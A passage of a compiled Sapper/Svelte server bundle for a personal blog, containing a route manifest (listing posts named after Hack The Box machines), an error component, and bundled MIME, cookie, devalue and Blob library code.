	map: "{\"version\":3,\"file\":\"_error.svelte\",\"sources\":[\"_error.svelte\"],\"sourcesContent\":[\"<script>\\n\\texport let status;\\n\\texport let error;\\n\\n\\tconst dev = undefined === 'development';\\n</script>\\n\\n<style>\\n\\th1, p {\\n\\t\\tmargin: 0 auto;\\n\\t}\\n\\n\\th1 {\\n\\t\\tfont-size: 2.8em;\\n\\t\\tfont-weight: 700;\\n\\t\\tmargin: 0 0 0.5em 0;\\n\\t}\\n\\n\\tp {\\n\\t\\tmargin: 1em auto;\\n\\t}\\n\\n\\t@media (min-width: 480px) {\\n\\t\\th1 {\\n\\t\\t\\tfont-size: 4em;\\n\\t\\t}\\n\\t}\\n</style>\\n\\n<svelte:head>\\n\\t<title>{status}</title>\\n</svelte:head>\\n\\n<h1>{status}</h1>\\n\\n<p>{error.message}</p>\\n\\n{#if dev && error.stack}\\n\\t<pre>{error.stack}</pre>\\n{/if}\\n\"],\"names\":[],\"mappings\":\"AAQC,gBAAE,CAAE,CAAC,cAAC,CAAC,AACN,MAAM,CAAE,CAAC,CAAC,IAAI,AACf,CAAC,AAED,EAAE,cAAC,CAAC,AACH,SAAS,CAAE,KAAK,CAChB,WAAW,CAAE,GAAG,CAChB,MAAM,CAAE,CAAC,CAAC,CAAC,CAAC,KAAK,CAAC,CAAC,AACpB,CAAC,AAED,CAAC,cAAC,CAAC,AACF,MAAM,CAAE,GAAG,CAAC,IAAI,AACjB,CAAC,AAED,MAAM,AAAC,YAAY,KAAK,CAAC,AAAC,CAAC,AAC1B,EAAE,cAAC,CAAC,AACH,SAAS,CAAE,GAAG,AACf,CAAC,AACF,CAAC\"}"
};

const Error$1 = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	let { status, error } = $$props;

	if ($$props.status === void 0 && $$bindings.status && status !== void 0) $$bindings.status(status);
	if ($$props.error === void 0 && $$bindings.error && error !== void 0) $$bindings.error(error);

	$$result.css.add(css$a);

	return `${($$result.head += `<title>${escape(status)}</title>`, "")}

	<h1 class="svelte-8od9u6">${escape(status)}</h1>

	<p class="svelte-8od9u6">${escape(error.message)}</p>

	${  `` }`;
});

// This file is generated by Sapper — do not edit it!

const d = decodeURIComponent;

const manifest = {
	server_routes: [
		{
			// blog/index.json.js
			pattern: /^\/blog\.json$/,
			handlers: route_0,
			params: () => ({})
		},

		{
			// blog/posts/first-post-test.md
			pattern: /^\/blog\/posts\/first-post-test\/?$/,
			handlers: route_1,
			params: () => ({})
		},

		{
			// blog/posts/markdown-test.md
			pattern: /^\/blog\/posts\/markdown-test\/?$/,
			handlers: route_2,
			params: () => ({})
		},

		{
			// blog/posts/hello-world.md
			pattern: /^\/blog\/posts\/hello-world\/?$/,
			handlers: route_3,
			params: () => ({})
		},

		{
			// blog/posts/second-post.md
			pattern: /^\/blog\/posts\/second-post\/?$/,
			handlers: route_4,
			params: () => ({})
		},

		{
			// blog/posts/Brainfuck.md
			pattern: /^\/blog\/posts\/Brainfuck\/?$/,
			handlers: route_5,
			params: () => ({})
		},

		{
			// blog/posts/Nibbles.md
			pattern: /^\/blog\/posts\/Nibbles\/?$/,
			handlers: route_6,
			params: () => ({})
		},

		{
			// blog/posts/Shocker.md
			pattern: /^\/blog\/posts\/Shocker\/?$/,
			handlers: route_7,
			params: () => ({})
		},

		{
			// blog/posts/testing.md
			pattern: /^\/blog\/posts\/testing\/?$/,
			handlers: route_8,
			params: () => ({})
		},

		{
			// blog/posts/Bashed.md
			pattern: /^\/blog\/posts\/Bashed\/?$/,
			handlers: route_9,
			params: () => ({})
		},

		{
			// blog/posts/Cronos.md
			pattern: /^\/blog\/posts\/Cronos\/?$/,
			handlers: route_10,
			params: () => ({})
		},

		{
			// blog/posts/Beep.md
			pattern: /^\/blog\/posts\/Beep\/?$/,
			handlers: route_11,
			params: () => ({})
		},

		{
			// blog/posts/Lame.md
			pattern: /^\/blog\/posts\/Lame\/?$/,
			handlers: route_12,
			params: () => ({})
		},

		{
			// blog/[slug].json.js
			pattern: /^\/blog\/([^\/]+?)\.json$/,
			handlers: route_13,
			params: match => ({ slug: d(match[1]) })
		}
	],

	pages: [
		{
			// index.svelte
			pattern: /^\/$/,
			parts: [
				{ name: "index", file: "index.svelte", component: Index }
			]
		},

		{
			// about.svelte
			pattern: /^\/about\/?$/,
			parts: [
				{ name: "about", file: "about.svelte", component: About }
			]
		},

		{
			// blog/index.svelte
			pattern: /^\/blog\/?$/,
			parts: [
				{ name: "blog", file: "blog/index.svelte", component: Index$1, preload: preload }
			]
		},

		{
			// blog/BackToTop.svelte
			pattern: /^\/blog\/BackToTop\/?$/,
			parts: [
				null,
				{ name: "blog_BackToTop", file: "blog/BackToTop.svelte", component: BackToTop }
			]
		},

		{
			// blog/[slug].svelte
			pattern: /^\/blog\/([^\/]+?)\/?$/,
			parts: [
				null,
				{ name: "blog_$slug", file: "blog/[slug].svelte", component: Slug, preload: preload$1, params: match => ({ slug: d(match[1]) }) }
			]
		}
	],

	root: Layout,
	root_preload: () => {},
	error: Error$1
};

const build_dir = "__sapper__/build";

/**
 * Create a `Writable` store that allows both updating and reading by subscription.
 * @param {*=}value initial value
 * @param {StartStopNotifier=}start start and stop notifications for subscriptions
 */
function writable(value, start = noop) {
    let stop;
    const subscribers = [];
    function set(new_value) {
        if (safe_not_equal(value, new_value)) {
            value = new_value;
            if (!stop) {
                return; // not ready
            }
            subscribers.forEach((s) => s[1]());
            subscribers.forEach((s) => s[0](value));
        }
    }
    function update(fn) {
        set(fn(value));
    }
    function subscribe(run, invalidate = noop) {
        const subscriber = [run, invalidate];
        subscribers.push(subscriber);
        if (subscribers.length === 1) {
            stop = start(set) || noop;
        }
        run(value);
        return () => {
            const index = subscribers.indexOf(subscriber);
            if (index !== -1) {
                subscribers.splice(index, 1);
            }
            if (subscribers.length === 0) {
                stop();
            }
        };
    }
    return { set, update, subscribe };
}

const CONTEXT_KEY = {};

/* src/node_modules/@sapper/internal/App.svelte generated by Svelte v3.5.0 */

const App = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	

	let { stores, error, status, segments, level0, level1 = null, notify } = $$props;

	afterUpdate(notify);
	setContext(CONTEXT_KEY, stores);

	if ($$props.stores === void 0 && $$bindings.stores && stores !== void 0) $$bindings.stores(stores);
	if ($$props.error === void 0 && $$bindings.error && error !== void 0) $$bindings.error(error);
	if ($$props.status === void 0 && $$bindings.status && status !== void 0) $$bindings.status(status);
	if ($$props.segments === void 0 && $$bindings.segments && segments !== void 0) $$bindings.segments(segments);
	if ($$props.level0 === void 0 && $$bindings.level0 && level0 !== void 0) $$bindings.level0(level0);
	if ($$props.level1 === void 0 && $$bindings.level1 && level1 !== void 0) $$bindings.level1(level1);
	if ($$props.notify === void 0 && $$bindings.notify && notify !== void 0) $$bindings.notify(notify);

	return `


	${validate_component(Layout, 'Layout').$$render($$result, Object.assign({ segment: segments[0] }, level0.props), {}, {
		default: () => `
		${ error ? `${validate_component(Error$1, 'Error').$$render($$result, { error: error, status: status }, {}, {})}` : `${validate_component(((level1.component) || missing_component), 'svelte:component').$$render($$result, Object.assign(level1.props), {}, {})}` }
	`
	})}`;
});

/**
 * @param typeMap [Object] Map of MIME type -> Array[extensions]
 * @param ...
 */
function Mime() {
  this._types = Object.create(null);
  this._extensions = Object.create(null);

  for (var i = 0; i < arguments.length; i++) {
    this.define(arguments[i]);
  }

  this.define = this.define.bind(this);
  this.getType = this.getType.bind(this);
  this.getExtension = this.getExtension.bind(this);
}

/**
 * Define mimetype -> extension mappings.  Each key is a mime-type that maps
 * to an array of extensions associated with the type.  The first extension is
 * used as the default extension for the type.
 *
 * e.g. mime.define({'audio/ogg', ['oga', 'ogg', 'spx']});
 *
 * If a type declares an extension that has already been defined, an error will
 * be thrown.  To suppress this error and force the extension to be associated
 * with the new type, pass `force`=true.  Alternatively, you may prefix the
 * extension with "*" to map the type to extension, without mapping the
 * extension to the type.
 *
 * e.g. mime.define({'audio/wav', ['wav']}, {'audio/x-wav', ['*wav']});
 *
 *
 * @param map (Object) type definitions
 * @param force (Boolean) if true, force overriding of existing definitions
 */
Mime.prototype.define = function(typeMap, force) {
  for (var type in typeMap) {
    var extensions = typeMap[type].map(function(t) {return t.toLowerCase()});
    type = type.toLowerCase();

    for (var i = 0; i < extensions.length; i++) {
      var ext = extensions[i];

      // '*' prefix = not the preferred type for this extension.  So fixup the
      // extension, and skip it.
      if (ext[0] == '*') {
        continue;
      }

      if (!force && (ext in this._types)) {
        throw new Error(
          'Attempt to change mapping for "' + ext +
          '" extension from "' + this._types[ext] + '" to "' + type +
          '". Pass `force=true` to allow this, otherwise remove "' + ext +
          '" from the list of extensions for "' + type + '".'
        );
      }

      this._types[ext] = type;
    }

    // Use first extension as default
    if (force || !this._extensions[type]) {
      var ext = extensions[0];
      this._extensions[type] = (ext[0] != '*') ? ext : ext.substr(1);
    }
  }
};

/**
 * Lookup a mime type based on extension
 */
Mime.prototype.getType = function(path) {
  path = String(path);
  var last = path.replace(/^.*[/\\]/, '').toLowerCase();
  var ext = last.replace(/^.*\./, '').toLowerCase();

  var hasPath = last.length < path.length;
  var hasDot = ext.length < last.length - 1;

  return (hasDot || !hasPath) && this._types[ext] || null;
};

/**
 * Return file extension associated with a mime type
 */
Mime.prototype.getExtension = function(type) {
  type = /^\s*([^;\s]*)/.test(type) && RegExp.$1;
  return type && this._extensions[type.toLowerCase()] || null;
};

var Mime_1 = Mime;

var standard = {"application/andrew-inset":["ez"],"application/applixware":["aw"],"application/atom+xml":["atom"],"application/atomcat+xml":["atomcat"],"application/atomsvc+xml":["atomsvc"],"application/bdoc":["bdoc"],"application/ccxml+xml":["ccxml"],"application/cdmi-capability":["cdmia"],"application/cdmi-container":["cdmic"],"application/cdmi-domain":["cdmid"],"application/cdmi-object":["cdmio"],"application/cdmi-queue":["cdmiq"],"application/cu-seeme":["cu"],"application/dash+xml":["mpd"],"application/davmount+xml":["davmount"],"application/docbook+xml":["dbk"],"application/dssc+der":["dssc"],"application/dssc+xml":["xdssc"],"application/ecmascript":["ecma","es"],"application/emma+xml":["emma"],"application/epub+zip":["epub"],"application/exi":["exi"],"application/font-tdpfr":["pfr"],"application/geo+json":["geojson"],"application/gml+xml":["gml"],"application/gpx+xml":["gpx"],"application/gxf":["gxf"],"application/gzip":["gz"],"application/hjson":["hjson"],"application/hyperstudio":["stk"],"application/inkml+xml":["ink","inkml"],"application/ipfix":["ipfix"],"application/java-archive":["jar","war","ear"],"application/java-serialized-object":["ser"],"application/java-vm":["class"],"application/javascript":["js","mjs"],"application/json":["json","map"],"application/json5":["json5"],"application/jsonml+json":["jsonml"],"application/ld+json":["jsonld"],"application/lost+xml":["lostxml"],"application/mac-binhex40":["hqx"],"application/mac-compactpro":["cpt"],"application/mads+xml":["mads"],"application/manifest+json":["webmanifest"],"application/marc":["mrc"],"application/marcxml+xml":["mrcx"],"application/mathematica":["ma","nb","mb"],"application/mathml+xml":["mathml"],"application/mbox":["mbox"],"application/mediaservercontrol+xml":["mscml"],"application/metalink+xml":["metalink"],"application/metalink4+xml":["meta4"],"application/mets+xml":["mets"],"application/mods+xml":["mods"],"application/mp21":["m21","mp21"],"application/mp4":["mp4s","m4p"],"application/msword":["doc","dot"],"application/mxf":["mxf"],"application/n-quads":["nq"],"application/n-triples":["nt"],"application/octet-stream":["bin","dms","lrf","mar","so","dist","distz","pkg","bpk","dump","elc","deploy","exe","dll","deb","dmg","iso","img","msi","msp","msm","buffer"],"application/oda":["oda"],"application/oebps-package+xml":["opf"],"application/ogg":["ogx"],"application/omdoc+xml":["omdoc"],"application/onenote":["onetoc","onetoc2","onetmp","onepkg"],"application/oxps":["oxps"],"application/patch-ops-error+xml":["xer"],"application/pdf":["pdf"],"application/pgp-encrypted":["pgp"],"application/pgp-signature":["asc","sig"],"application/pics-rules":["prf"],"application/pkcs10":["p10"],"application/pkcs7-mime":["p7m","p7c"],"application/pkcs7-signature":["p7s"],"application/pkcs8":["p8"],"application/pkix-attr-cert":["ac"],"application/pkix-cert":["cer"],"application/pkix-crl":["crl"],"application/pkix-pkipath":["pkipath"],"application/pkixcmp":["pki"],"application/pls+xml":["pls"],"application/postscript":["ai","eps","ps"],"application/pskc+xml":["pskcxml"],"application/raml+yaml":["raml"],"application/rdf+xml":["rdf","owl"],"application/reginfo+xml":["rif"],"application/relax-ng-compact-syntax":["rnc"],"application/resource-lists+xml":["rl"],"application/resource-lists-diff+xml":["rld"],"application/rls-services+xml":["rs"],"application/rpki-ghostbusters":["gbr"],"application/rpki-manifest":["mft"],"application/rpki-roa":["roa"],"application/rsd+xml":["rsd"],"application/rss+xml":["rss"],"application/rtf":["rtf"],"application/sbml+xml":["sbml"],"application/scvp-cv-request":["scq"],"application/scvp-cv-response":["scs"],"application/scvp-vp-request":["spq"],"application/scvp-vp-response":["spp"],"application/sdp":["sdp"],"application/set-payment-initiation":["setpay"],"application/set-registration-initiation":["setreg"],"application/shf+xml":["shf"],"application/sieve":["siv","sieve"],"application/smil+xml":["smi","smil"],"application/sparql-query":["rq"],"application/sparql-results+xml":["srx"],"application/srgs":["gram"],"application/srgs+xml":["grxml"],"application/sru+xml":["sru"],"application/ssdl+xml":["ssdl"],"application/ssml+xml":["ssml"],"application/tei+xml":["tei","teicorpus"],"application/thraud+xml":["tfi"],"application/timestamped-data":["tsd"],"application/voicexml+xml":["vxml"],"application/wasm":["wasm"],"application/widget":["wgt"],"application/winhlp":["hlp"],"application/wsdl+xml":["wsdl"],"application/wspolicy+xml":["wspolicy"],"application/xaml+xml":["xaml"],"application/xcap-diff+xml":["xdf"],"application/xenc+xml":["xenc"],"application/xhtml+xml":["xhtml","xht"],"application/xml":["xml","xsl","xsd","rng"],"application/xml-dtd":["dtd"],"application/xop+xml":["xop"],"application/xproc+xml":["xpl"],"application/xslt+xml":["xslt"],"application/xspf+xml":["xspf"],"application/xv+xml":["mxml","xhvml","xvml","xvm"],"application/yang":["yang"],"application/yin+xml":["yin"],"application/zip":["zip"],"audio/3gpp":["*3gpp"],"audio/adpcm":["adp"],"audio/basic":["au","snd"],"audio/midi":["mid","midi","kar","rmi"],"audio/mp3":["*mp3"],"audio/mp4":["m4a","mp4a"],"audio/mpeg":["mpga","mp2","mp2a","mp3","m2a","m3a"],"audio/ogg":["oga","ogg","spx"],"audio/s3m":["s3m"],"audio/silk":["sil"],"audio/wav":["wav"],"audio/wave":["*wav"],"audio/webm":["weba"],"audio/xm":["xm"],"font/collection":["ttc"],"font/otf":["otf"],"font/ttf":["ttf"],"font/woff":["woff"],"font/woff2":["woff2"],"image/aces":["exr"],"image/apng":["apng"],"image/bmp":["bmp"],"image/cgm":["cgm"],"image/dicom-rle":["drle"],"image/emf":["emf"],"image/fits":["fits"],"image/g3fax":["g3"],"image/gif":["gif"],"image/heic":["heic"],"image/heic-sequence":["heics"],"image/heif":["heif"],"image/heif-sequence":["heifs"],"image/ief":["ief"],"image/jls":["jls"],"image/jp2":["jp2","jpg2"],"image/jpeg":["jpeg","jpg","jpe"],"image/jpm":["jpm"],"image/jpx":["jpx","jpf"],"image/jxr":["jxr"],"image/ktx":["ktx"],"image/png":["png"],"image/sgi":["sgi"],"image/svg+xml":["svg","svgz"],"image/t38":["t38"],"image/tiff":["tif","tiff"],"image/tiff-fx":["tfx"],"image/webp":["webp"],"image/wmf":["wmf"],"message/disposition-notification":["disposition-notification"],"message/global":["u8msg"],"message/global-delivery-status":["u8dsn"],"message/global-disposition-notification":["u8mdn"],"message/global-headers":["u8hdr"],"message/rfc822":["eml","mime"],"model/3mf":["3mf"],"model/gltf+json":["gltf"],"model/gltf-binary":["glb"],"model/iges":["igs","iges"],"model/mesh":["msh","mesh","silo"],"model/stl":["stl"],"model/vrml":["wrl","vrml"],"model/x3d+binary":["*x3db","x3dbz"],"model/x3d+fastinfoset":["x3db"],"model/x3d+vrml":["*x3dv","x3dvz"],"model/x3d+xml":["x3d","x3dz"],"model/x3d-vrml":["x3dv"],"text/cache-manifest":["appcache","manifest"],"text/calendar":["ics","ifb"],"text/coffeescript":["coffee","litcoffee"],"text/css":["css"],"text/csv":["csv"],"text/html":["html","htm","shtml"],"text/jade":["jade"],"text/jsx":["jsx"],"text/less":["less"],"text/markdown":["markdown","md"],"text/mathml":["mml"],"text/mdx":["mdx"],"text/n3":["n3"],"text/plain":["txt","text","conf","def","list","log","in","ini"],"text/richtext":["rtx"],"text/rtf":["*rtf"],"text/sgml":["sgml","sgm"],"text/shex":["shex"],"text/slim":["slim","slm"],"text/stylus":["stylus","styl"],"text/tab-separated-values":["tsv"],"text/troff":["t","tr","roff","man","me","ms"],"text/turtle":["ttl"],"text/uri-list":["uri","uris","urls"],"text/vcard":["vcard"],"text/vtt":["vtt"],"text/xml":["*xml"],"text/yaml":["yaml","yml"],"video/3gpp":["3gp","3gpp"],"video/3gpp2":["3g2"],"video/h261":["h261"],"video/h263":["h263"],"video/h264":["h264"],"video/jpeg":["jpgv"],"video/jpm":["*jpm","jpgm"],"video/mj2":["mj2","mjp2"],"video/mp2t":["ts"],"video/mp4":["mp4","mp4v","mpg4"],"video/mpeg":["mpeg","mpg","mpe","m1v","m2v"],"video/ogg":["ogv"],"video/quicktime":["qt","mov"],"video/webm":["webm"]};

var lite = new Mime_1(standard);

function get_server_route_handler(routes) {
	async function handle_route(route, req, res, next) {
		req.params = route.params(route.pattern.exec(req.path));

		const method = req.method.toLowerCase();
		// 'delete' cannot be exported from a module because it is a keyword,
		// so check for 'del' instead
		const method_export = method === 'delete' ? 'del' : method;
		const handle_method = route.handlers[method_export];
		if (handle_method) {
			if (process.env.SAPPER_EXPORT) {
				const { write, end, setHeader } = res;
				const chunks = [];
				const headers = {};

				// intercept data so that it can be exported
				res.write = function(chunk) {
					chunks.push(Buffer.from(chunk));
					write.apply(res, arguments);
				};

				res.setHeader = function(name, value) {
					headers[name.toLowerCase()] = value;
					setHeader.apply(res, arguments);
				};

				res.end = function(chunk) {
					if (chunk) chunks.push(Buffer.from(chunk));
					end.apply(res, arguments);

					process.send({
						__sapper__: true,
						event: 'file',
						url: req.url,
						method: req.method,
						status: res.statusCode,
						type: headers['content-type'],
						body: Buffer.concat(chunks).toString()
					});
				};
			}

			const handle_next = (err) => {
				if (err) {
					res.statusCode = 500;
					res.end(err.message);
				} else {
					process.nextTick(next);
				}
			};

			try {
				await handle_method(req, res, handle_next);
			} catch (err) {
				console.error(err);
				handle_next(err);
			}
		} else {
			// no matching handler for method
			process.nextTick(next);
		}
	}

	return function find_route(req, res, next) {
		for (const route of routes) {
			if (route.pattern.test(req.path)) {
				handle_route(route, req, res, next);
				return;
			}
		}

		next();
	};
}

/*!
 * cookie
 * Copyright(c) 2012-2014 Roman Shtylman
 * Copyright(c) 2015 Douglas Christopher Wilson
 * MIT Licensed
 */

/**
 * Module exports.
 * @public
 */

var parse_1 = parse;
var serialize_1 = serialize;

/**
 * Module variables.
 * @private
 */

var decode = decodeURIComponent;
var encode = encodeURIComponent;
var pairSplitRegExp = /; */;

/**
 * RegExp to match field-content in RFC 7230 sec 3.2
 *
 * field-content = field-vchar [ 1*( SP / HTAB ) field-vchar ]
 * field-vchar   = VCHAR / obs-text
 * obs-text      = %x80-FF
 */

var fieldContentRegExp = /^[\u0009\u0020-\u007e\u0080-\u00ff]+$/;

/**
 * Parse a cookie header.
 *
 * Parse the given cookie header string into an object
 * The object has the various cookies as keys(names) => values
 *
 * @param {string} str
 * @param {object} [options]
 * @return {object}
 * @public
 */

function parse(str, options) {
  if (typeof str !== 'string') {
    throw new TypeError('argument str must be a string');
  }

  var obj = {};
  var opt = options || {};
  var pairs = str.split(pairSplitRegExp);
  var dec = opt.decode || decode;

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i];
    var eq_idx = pair.indexOf('=');

    // skip things that don't look like key=value
    if (eq_idx < 0) {
      continue;
    }

    var key = pair.substr(0, eq_idx).trim();
    var val = pair.substr(++eq_idx, pair.length).trim();

    // quoted values
    if ('"' == val[0]) {
      val = val.slice(1, -1);
    }

    // only assign once
    if (undefined == obj[key]) {
      obj[key] = tryDecode(val, dec);
    }
  }

  return obj;
}

/**
 * Serialize data into a cookie header.
 *
 * Serialize the a name value pair into a cookie string suitable for
 * http headers. An optional options object specified cookie parameters.
 *
 * serialize('foo', 'bar', { httpOnly: true })
 *   => "foo=bar; httpOnly"
 *
 * @param {string} name
 * @param {string} val
 * @param {object} [options]
 * @return {string}
 * @public
 */

function serialize(name, val, options) {
  var opt = options || {};
  var enc = opt.encode || encode;

  if (typeof enc !== 'function') {
    throw new TypeError('option encode is invalid');
  }

  if (!fieldContentRegExp.test(name)) {
    throw new TypeError('argument name is invalid');
  }

  var value = enc(val);

  if (value && !fieldContentRegExp.test(value)) {
    throw new TypeError('argument val is invalid');
  }

  var str = name + '=' + value;

  if (null != opt.maxAge) {
    var maxAge = opt.maxAge - 0;
    if (isNaN(maxAge)) throw new Error('maxAge should be a Number');
    str += '; Max-Age=' + Math.floor(maxAge);
  }

  if (opt.domain) {
    if (!fieldContentRegExp.test(opt.domain)) {
      throw new TypeError('option domain is invalid');
    }

    str += '; Domain=' + opt.domain;
  }

  if (opt.path) {
    if (!fieldContentRegExp.test(opt.path)) {
      throw new TypeError('option path is invalid');
    }

    str += '; Path=' + opt.path;
  }

  if (opt.expires) {
    if (typeof opt.expires.toUTCString !== 'function') {
      throw new TypeError('option expires is invalid');
    }

    str += '; Expires=' + opt.expires.toUTCString();
  }

  if (opt.httpOnly) {
    str += '; HttpOnly';
  }

  if (opt.secure) {
    str += '; Secure';
  }

  if (opt.sameSite) {
    var sameSite = typeof opt.sameSite === 'string'
      ? opt.sameSite.toLowerCase() : opt.sameSite;

    switch (sameSite) {
      case true:
        str += '; SameSite=Strict';
        break;
      case 'lax':
        str += '; SameSite=Lax';
        break;
      case 'strict':
        str += '; SameSite=Strict';
        break;
      case 'none':
        str += '; SameSite=None';
        break;
      default:
        throw new TypeError('option sameSite is invalid');
    }
  }

  return str;
}

/**
 * Try decoding a string using a decoding function.
 *
 * @param {string} str
 * @param {function} decode
 * @private
 */

function tryDecode(str, decode) {
  try {
    return decode(str);
  } catch (e) {
    return str;
  }
}

var cookie = {
	parse: parse_1,
	serialize: serialize_1
};

var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$';
var unsafeChars = /[<>\b\f\n\r\t\0\u2028\u2029]/g;
var reserved = /^(?:do|if|in|for|int|let|new|try|var|byte|case|char|else|enum|goto|long|this|void|with|await|break|catch|class|const|final|float|short|super|throw|while|yield|delete|double|export|import|native|return|switch|throws|typeof|boolean|default|extends|finally|package|private|abstract|continue|debugger|function|volatile|interface|protected|transient|implements|instanceof|synchronized)$/;
var escaped$1 = {
    '<': '\\u003C',
    '>': '\\u003E',
    '/': '\\u002F',
    '\\': '\\\\',
    '\b': '\\b',
    '\f': '\\f',
    '\n': '\\n',
    '\r': '\\r',
    '\t': '\\t',
    '\0': '\\0',
    '\u2028': '\\u2028',
    '\u2029': '\\u2029'
};
var objectProtoOwnPropertyNames = Object.getOwnPropertyNames(Object.prototype).sort().join('\0');
function devalue(value) {
    var counts = new Map();
    function walk(thing) {
        if (typeof thing === 'function') {
            throw new Error("Cannot stringify a function");
        }
        if (counts.has(thing)) {
            counts.set(thing, counts.get(thing) + 1);
            return;
        }
        counts.set(thing, 1);
        if (!isPrimitive(thing)) {
            var type = getType(thing);
            switch (type) {
                case 'Number':
                case 'String':
                case 'Boolean':
                case 'Date':
                case 'RegExp':
                    return;
                case 'Array':
                    thing.forEach(walk);
                    break;
                case 'Set':
                case 'Map':
                    Array.from(thing).forEach(walk);
                    break;
                default:
                    var proto = Object.getPrototypeOf(thing);
                    if (proto !== Object.prototype &&
                        proto !== null &&
                        Object.getOwnPropertyNames(proto).sort().join('\0') !== objectProtoOwnPropertyNames) {
                        throw new Error("Cannot stringify arbitrary non-POJOs");
                    }
                    if (Object.getOwnPropertySymbols(thing).length > 0) {
                        throw new Error("Cannot stringify POJOs with symbolic keys");
                    }
                    Object.keys(thing).forEach(function (key) { return walk(thing[key]); });
            }
        }
    }
    walk(value);
    var names = new Map();
    Array.from(counts)
        .filter(function (entry) { return entry[1] > 1; })
        .sort(function (a, b) { return b[1] - a[1]; })
        .forEach(function (entry, i) {
        names.set(entry[0], getName(i));
    });
    function stringify(thing) {
        if (names.has(thing)) {
            return names.get(thing);
        }
        if (isPrimitive(thing)) {
            return stringifyPrimitive(thing);
        }
        var type = getType(thing);
        switch (type) {
            case 'Number':
            case 'String':
            case 'Boolean':
                return "Object(" + stringify(thing.valueOf()) + ")";
            case 'RegExp':
                return thing.toString();
            case 'Date':
                return "new Date(" + thing.getTime() + ")";
            case 'Array':
                var members = thing.map(function (v, i) { return i in thing ? stringify(v) : ''; });
                var tail = thing.length === 0 || (thing.length - 1 in thing) ? '' : ',';
                return "[" + members.join(',') + tail + "]";
            case 'Set':
            case 'Map':
                return "new " + type + "([" + Array.from(thing).map(stringify).join(',') + "])";
            default:
                var obj = "{" + Object.keys(thing).map(function (key) { return safeKey(key) + ":" + stringify(thing[key]); }).join(',') + "}";
                var proto = Object.getPrototypeOf(thing);
                if (proto === null) {
                    return Object.keys(thing).length > 0
                        ? "Object.assign(Object.create(null)," + obj + ")"
                        : "Object.create(null)";
                }
                return obj;
        }
    }
    var str = stringify(value);
    if (names.size) {
        var params_1 = [];
        var statements_1 = [];
        var values_1 = [];
        names.forEach(function (name, thing) {
            params_1.push(name);
            if (isPrimitive(thing)) {
                values_1.push(stringifyPrimitive(thing));
                return;
            }
            var type = getType(thing);
            switch (type) {
                case 'Number':
                case 'String':
                case 'Boolean':
                    values_1.push("Object(" + stringify(thing.valueOf()) + ")");
                    break;
                case 'RegExp':
                    values_1.push(thing.toString());
                    break;
                case 'Date':
                    values_1.push("new Date(" + thing.getTime() + ")");
                    break;
                case 'Array':
                    values_1.push("Array(" + thing.length + ")");
                    thing.forEach(function (v, i) {
                        statements_1.push(name + "[" + i + "]=" + stringify(v));
                    });
                    break;
                case 'Set':
                    values_1.push("new Set");
                    statements_1.push(name + "." + Array.from(thing).map(function (v) { return "add(" + stringify(v) + ")"; }).join('.'));
                    break;
                case 'Map':
                    values_1.push("new Map");
                    statements_1.push(name + "." + Array.from(thing).map(function (_a) {
                        var k = _a[0], v = _a[1];
                        return "set(" + stringify(k) + ", " + stringify(v) + ")";
                    }).join('.'));
                    break;
                default:
                    values_1.push(Object.getPrototypeOf(thing) === null ? 'Object.create(null)' : '{}');
                    Object.keys(thing).forEach(function (key) {
                        statements_1.push("" + name + safeProp(key) + "=" + stringify(thing[key]));
                    });
            }
        });
        statements_1.push("return " + str);
        return "(function(" + params_1.join(',') + "){" + statements_1.join(';') + "}(" + values_1.join(',') + "))";
    }
    else {
        return str;
    }
}
function getName(num) {
    var name = '';
    do {
        name = chars[num % chars.length] + name;
        num = ~~(num / chars.length) - 1;
    } while (num >= 0);
    return reserved.test(name) ? name + "_" : name;
}
function isPrimitive(thing) {
    return Object(thing) !== thing;
}
function stringifyPrimitive(thing) {
    if (typeof thing === 'string')
        return stringifyString(thing);
    if (thing === void 0)
        return 'void 0';
    if (thing === 0 && 1 / thing < 0)
        return '-0';
    var str = String(thing);
    if (typeof thing === 'number')
        return str.replace(/^(-)?0\./, '$1.');
    return str;
}
function getType(thing) {
    return Object.prototype.toString.call(thing).slice(8, -1);
}
function escapeUnsafeChar(c) {
    return escaped$1[c] || c;
}
function escapeUnsafeChars(str) {
    return str.replace(unsafeChars, escapeUnsafeChar);
}
function safeKey(key) {
    return /^[_$a-zA-Z][_$a-zA-Z0-9]*$/.test(key) ? key : escapeUnsafeChars(JSON.stringify(key));
}
function safeProp(key) {
    return /^[_$a-zA-Z][_$a-zA-Z0-9]*$/.test(key) ? "." + key : "[" + escapeUnsafeChars(JSON.stringify(key)) + "]";
}
function stringifyString(str) {
    var result = '"';
    for (var i = 0; i < str.length; i += 1) {
        var char = str.charAt(i);
        var code = char.charCodeAt(0);
        if (char === '"') {
            result += '\\"';
        }
        else if (char in escaped$1) {
            result += escaped$1[char];
        }
        else if (code >= 0xd800 && code <= 0xdfff) {
            var next = str.charCodeAt(i + 1);
            // If this is the beginning of a [high, low] surrogate pair,
            // add the next two characters, otherwise escape
            if (code <= 0xdbff && (next >= 0xdc00 && next <= 0xdfff)) {
                result += char + str[++i];
            }
            else {
                result += "\\u" + code.toString(16).toUpperCase();
            }
        }
        else {
            result += char;
        }
    }
    result += '"';
    return result;
}

// Based on https://github.com/tmpvar/jsdom/blob/aa85b2abf07766ff7bf5c1f6daafb3726f2f2db5/lib/jsdom/living/blob.js

// fix for "Readable" isn't a named export issue
const Readable = Stream.Readable;

const BUFFER = Symbol('buffer');
const TYPE = Symbol('type');

class Blob {
	constructor() {
		this[TYPE] = '';

		const blobParts = arguments[0];
		const options = arguments[1];

		const buffers = [];
		let size = 0;

		if (blobParts) {
			const a = blobParts;
			const length = Number(a.length);
			for (let i = 0; i < length; i++) {
				const element = a[i];
				let buffer;
				if (element instanceof Buffer) {
					buffer = element;
				} else if (ArrayBuffer.isView(element)) {
					buffer = Buffer.from(element.buffer, element.byteOffset, element.byteLength);
				} else if (element instanceof ArrayBuffer) {
					buffer = Buffer.from(element);
				} else if (element instanceof Blob) {
					buffer = element[BUFFER];
				} else {
					buffer = Buffer.from(typeof element === 'string' ? element : String(element));
				}
				size += buffer.length;
				buffers.push(buffer);
			}
		}

		this[BUFFER] = Buffer.concat(buffers);

		let type = options && options.type !== undefined && String(options.type).toLowerCase();
		if (type && !/[^\u0020-\u007E]/.test(type)) {
			this[TYPE] = type;
		}
	}
	get size() {
		return this[BUFFER].length;
	}
	get type() {
		return this[TYPE];
	}
